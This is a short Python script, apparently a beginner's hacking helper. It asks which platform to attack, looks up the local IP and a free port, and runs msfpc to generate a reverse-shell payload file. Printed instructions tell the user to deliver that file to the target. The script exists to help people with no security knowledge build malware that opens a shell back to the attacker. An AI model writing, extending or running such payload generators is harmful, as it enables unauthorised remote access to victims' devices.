from sys import exit
import socket
import os, time

os.system("clear")
os.system("python3 banner.py")
"""Show About"""
print("\x1b[39mThis Application Is From Peaple Who \x1b[31mDont Know Kali Linux\x1b[39m.This Application Helps You To Start Hacking.")
print("\n\nPowered By \x1b[32mAr$h1a\x1b[39m\n")

def validip(ip):
	if ip.count(".") == 3:
		try:
			int(ip.replace(".",""))
			return True
		except:
			return False
	else:
		return False
def validport(port):
	try:
		p = int(port)
		return True
	except:
		return False
while True:
	ok = ["android","windows","osx","php","asp","aspx","bash","java","linux","perl","powershell","python","tomcat"]
	x = input("Which Paltform/file type Do You Want To Attack?(if you Want See List Print 'help')").lower()
	if x == "back" or x == "exit":
		exit()
	if x == "help":
		print("Paltform That You Select Should Be In This List:")
		for i in ok:
			print("\t\x1b[33m- "+i.upper()+"\x1b[39m")
	else:
		print(x)
		o = False
		for i in ok:
			if x == i:
				o = True
				break
			else:
				pass
		if o == False:
			print("Platform/File Type Npt Found...")
			break
		
		"""Find Local IP"""
		os.system("python3 platform/myip.py")
		f = open("ip","r")
		ip = f.readline().replace("\n","")
		f.close()
		os.remove("ip")

		if not validip(ip):
			print("IP Isnt Valid.")
			break
			
		"""Find An Closed Port"""
		os.system("python3 platform/sp.py")
		f = open("port.txt","r")
		port = f.readline().replace("\n","")
		f.close()
		time.sleep(1)
		os.remove("port.txt")
			
		if not validport(port):
			print("Port Is Not Valid!")
			break
		
		print("""\n\n\x1b[32mNow I Try To Use Some Kali Tools.After That Tools Say It To You That Should Execute A Command.
		After That You Executed,You Should Give The File That You Created To Target.It Should Save In Your Current Directory.
		(You Shouldnt Send .rc File)\x1b[39m\n\n""")
		
		a = input("Press Enter To Continue...")
		dic = {"android":"apk"}
		for i in dic:
			if x == i:
				x = dic[i]
		os.system("msfpc " + x + " " + ip + " " + port)
